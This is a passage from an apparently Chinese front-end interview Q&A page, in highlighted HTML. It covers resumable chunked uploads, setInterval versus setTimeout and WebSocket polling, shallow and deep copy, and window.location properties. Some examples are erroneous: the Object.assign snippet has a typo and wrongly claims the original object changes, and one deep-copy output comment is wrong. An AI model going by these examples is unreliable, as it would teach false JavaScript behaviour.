keyword\">let</span> task <span class=\"token operator\">=</span> <span class=\"token function\">post</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/mkblk.php\"</span><span class=\"token punctuation\">,</span> fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">res</span><span class=\"token operator\">=></span><span class=\"token punctuation\">&#123;</span>\n <span class=\"token comment\">// 上传成功后保存已上传切片记录</span>\n <span class=\"token function\">saveUploadSliceRecord</span><span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">)</span>\n record<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span>\n <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n tasks<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>task<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>此时上传时刷新页面或者关闭浏览器，再次上传相同文件时，之前已经上传成功的切片就不会再重新上传了。</p>\n<p>服务端实现断点续传的逻辑基本相似，只要在getUploadSliceRecord内部调用服务端的查询接口获取已上传切片的记录即可，因此这里不再展开。</p>\n<p>此外断点续传还需要考虑<strong>切片过期</strong>的情况：如果调用了mkfile接口，则磁盘上的切片内容就可以清除掉了，如果客户端一直不调用mkfile的接口，放任这些切片一直保存在磁盘显然是不可靠的，一般情况下，切片上传都有一段时间的有效期，超过该有效期，就会被清除掉。基于上述原因，断点续传也必须同步切片过期的实现逻辑。</p>\n<p><strong>上传进度和暂停</strong></p>\n<p>通过xhr.upload中的progress方法可以实现监控每一个切片上传进度。</p>\n<p>上传暂停的实现也比较简单，通过xhr.abort可以取消当前未完成上传切片的上传，实现上传暂停的效果，恢复上传就跟断点续传类似，先获取已上传的切片列表，然后重新发送未上传的切片。</p>\n<p>由于篇幅关系，上传进度和暂停的功能这里就先不实现了。</p>\n<h3 id=\"45、使用setInterval请求实时数据，返回顺序不一致怎么解决\"><a href=\"#45、使用setInterval请求实时数据，返回顺序不一致怎么解决\" class=\"headerlink\" title=\"45、使用setInterval请求实时数据，返回顺序不一致怎么解决\"></a>45、使用setInterval请求实时数据，返回顺序不一致怎么解决</h3><p><strong>参考答案：</strong></p>\n<p>场景：</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token function\">setInterval</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    $<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/path/to/server\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data<span class=\"token punctuation\">,</span> status</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>上面的程序会每隔10秒向服务器请求一次数据，并在数据到达后存储。这个实现方法通常可以满足简单的需求，然而同时也存在着很大的缺陷：在网络情况不稳定的情况下，服务器从接收请求、发送请求到客户端接收请求的总时间有可能超过10秒，而请求是以10秒间隔发送的，这样会导致接收的数据到达先后顺序与发送顺序不一致。</p>\n<p>解决方案：</p>\n<ol>\n<li><p>使用setTimeout代替setInterval</p>\n<p>程序首先设置10秒后发起请求，当数据返回后再隔10秒发起第二次请求，以此类推。这样的话虽然无法保证两次请求之间的时间间隔为固定值，但是可以保证到达数据的顺序。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">poll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        $<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/path/to/server\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data<span class=\"token punctuation\">,</span> status</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">// 发起下一次请求</span>\n            <span class=\"token function\">poll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>WebSocket</p>\n<p>WebSocket 协议本质上是一个基于 TCP 的协议。</p>\n<p>为了建立一个 WebSocket 连接，客户端浏览器首先要向服务器发起一个 HTTP 请求，这个请求和通常的 HTTP 请求不同，包含了一些附加头信息，其中附加头信息”Upgrade: WebSocket”表明这是一个申请协议升级的 HTTP 请求，服务器端解析这些附加的头信息然后产生应答信息返回给客户端，客户端和服务器端的 WebSocket 连接就建立起来了，双方就可以通过这个连接通道自由的传递信息，<strong>并且这个连接会持续存在直到客户端或者服务器端的某一方主动的关闭连接。</strong></p>\n<p>服务器（Node.js）：</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> WebSocketServer <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ws'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>Server<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> wss <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">WebSocketServer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token literal-property property\">port</span><span class=\"token operator\">:</span> <span class=\"token number\">8080</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nwss<span class=\"token punctuation\">.</span><span class=\"token function\">on</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"connection\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">socket</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    socket<span class=\"token punctuation\">.</span><span class=\"token function\">on</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"message\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">msg</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        socket<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Nice to meet you!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>客户端同样可以使用Node.js或者是浏览器实现，这里选用浏览器作为客户端：</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token comment\">// WebSocket 为客户端JavaScript的原生对象</span>\n<span class=\"token keyword\">var</span> ws <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">WebSocket</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ws://localhost:8080\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nws<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onopen</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">event</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    ws<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello there!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\nws<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onmessage</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">event</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>event<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ol>\n<h3 id=\"46、浅拷贝，深拷贝-实现方式\"><a href=\"#46、浅拷贝，深拷贝-实现方式\" class=\"headerlink\" title=\"46、浅拷贝，深拷贝(实现方式)\"></a>46、浅拷贝，深拷贝(实现方式)</h3><p><strong>参考答案：</strong></p>\n<p>浅拷贝和深拷贝都只针对于引用数据类型，浅拷贝只复制指向某个对象的指针，而不复制对象本身，新旧对象还是共享同一块内存；但深拷贝会另外创造一个一模一样的对象，新对象跟原对象不共享内存，修改新对象不会改到原对象；</p>\n<p>区别：浅拷贝只复制对象的第一层属性、深拷贝可以对对象的属性进行递归复制；</p>\n<p>实现浅拷贝方法</p>\n<p>（1）Object.assign方法</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> obj <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token literal-property property\">a</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n    <span class=\"token literal-property property\">b</span><span class=\"token operator\">:</span> <span class=\"token number\">2</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">var</span> obj1 <span class=\"token operator\">=</span> Object<span class=\"token punctuation\">.</span><span class=\"token function\">assign</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nboj1<span class=\"token punctuation\">.</span>a <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 3</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>（2）for in方法</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token comment\">// 只复制第一层的浅拷贝</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">simpleCopy</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">obj1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n   <span class=\"token keyword\">var</span> obj2 <span class=\"token operator\">=</span> Array<span class=\"token punctuation\">.</span><span class=\"token function\">isArray</span><span class=\"token punctuation\">(</span>obj1<span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token keyword\">in</span> obj1<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n   obj2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> obj1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n   <span class=\"token keyword\">return</span> obj2<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">var</span> obj1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n   <span class=\"token literal-property property\">a</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n   <span class=\"token literal-property property\">b</span><span class=\"token operator\">:</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span>\n   <span class=\"token literal-property property\">c</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span>\n         <span class=\"token literal-property property\">d</span><span class=\"token operator\">:</span> <span class=\"token number\">3</span>\n      <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">var</span> obj2 <span class=\"token operator\">=</span> <span class=\"token function\">simpleCopy</span><span class=\"token punctuation\">(</span>obj1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nobj2<span class=\"token punctuation\">.</span>a <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\nobj2<span class=\"token punctuation\">.</span>c<span class=\"token punctuation\">.</span>d <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>obj1<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 1</span>\n<span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>obj2<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 3</span>\n<span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>obj1<span class=\"token punctuation\">.</span>c<span class=\"token punctuation\">.</span>d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 4</span>\n<span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>obj2<span class=\"token punctuation\">.</span>c<span class=\"token punctuation\">.</span>d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 4</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>实现深拷贝方法</p>\n<p>（1）采用递归去拷贝所有层级属性</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">deepClone</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">obj</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> objClone <span class=\"token operator\">=</span> Array<span class=\"token punctuation\">.</span><span class=\"token function\">isArray</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">:</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>obj <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">typeof</span> obj<span class=\"token operator\">===</span><span class=\"token string\">\"object\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>key <span class=\"token keyword\">in</span> obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">.</span><span class=\"token function\">hasOwnProperty</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n                <span class=\"token comment\">//判断ojb子元素是否为对象，如果是，递归复制</span>\n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">typeof</span> obj<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span><span class=\"token string\">\"object\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n                    objClone<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">deepClone</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n                    <span class=\"token comment\">//如果不是，简单复制</span>\n                    objClone<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> obj<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> objClone<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>    \n<span class=\"token keyword\">let</span> a<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    b<span class=\"token operator\">=</span><span class=\"token function\">deepClone</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\na<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>（2）使用JSON.stringify和JSON.parse实现深拷贝：JSON.stringify把对象转成字符串，再用JSON.parse把字符串转成新的对象；</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">deepCopy</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">obj1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> _obj <span class=\"token operator\">=</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span>obj1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">let</span> obj2 <span class=\"token operator\">=</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>_obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> obj2<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">var</span> a <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">var</span> b <span class=\"token operator\">=</span> <span class=\"token function\">deepCopy</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    b<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 1,1,2,3,4</span>\n    <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 2,2,2,3,4</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>（3）热门的函数库lodash，也有提供_.cloneDeep用来做深拷贝；</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> _ <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'lodash'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> obj1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token literal-property property\">a</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n    <span class=\"token literal-property property\">b</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">f</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">g</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n    <span class=\"token literal-property property\">c</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> obj2 <span class=\"token operator\">=</span> _<span class=\"token punctuation\">.</span><span class=\"token function\">cloneDeep</span><span class=\"token punctuation\">(</span>obj1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>obj1<span class=\"token punctuation\">.</span>b<span class=\"token punctuation\">.</span>f <span class=\"token operator\">===</span> obj2<span class=\"token punctuation\">.</span>b<span class=\"token punctuation\">.</span>f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// false</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"47、获取当前页面url\"><a href=\"#47、获取当前页面url\" class=\"headerlink\" title=\"47、获取当前页面url\"></a>47、获取当前页面url</h3><p><strong>参考答案：</strong></p>\n<ol>\n<li>window.location.href (设置或获取整个 URL 为字符串)</li>\n</ol>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> test <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token punctuation\">;</span>\n<span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//  返回：http://i.cnblogs.com/EditPosts.aspx?opt=1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<ol>\n<li>window.location.protocol (设置或获取 URL 的协议部分)</li>\n</ol>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> test <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>protocol<span class=\"token punctuation\">;</span>\n<span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//返回：http:</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<ol>\n<li>window.location.host (设置或获取 URL 的主机部分)</li>\n</ol>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> test <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>host<span class=\"token punctuation\">;</span>\n<span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//返回：i.cnblogs.com</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<ol>\n<li>window.location.port (设置或获取与 URL 关联的端口号码)</li>\n</ol>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> test <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>port<span class=\"token punctuation\">;</span>\n<span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//返回：空字符(如果采用默认的80端口 (update:即使添加了:80)，那么返回值并不是默认的80而是空字符)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<ol>\n<li>window.location.pathname (设置或获取与 URL 的路径部分（就是文件地址）)</li>\n</ol>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> test <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>pathname<span class=\"token punctuation\">;</span>\n<span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//返回：/EditPosts.aspx</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<ol>\n<li>window.location.search (设置或获取 href 属性中跟在问号后面的部分)</li>\n</ol>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> test <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">;</span>\n<span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//返回：?opt=1</span>\n（<span class=\"token constant\">PS</span>：获得查询（参数）部分，除了给动态语言赋值以外，我们同样可以给静态页面，并使用javascript来获得相信应的参数值。）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ol>\n<li>window.location.hash (设置或获取 href 属性中在井号“#”后面的分段)</li>\n</ol>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> test <span class=\"token 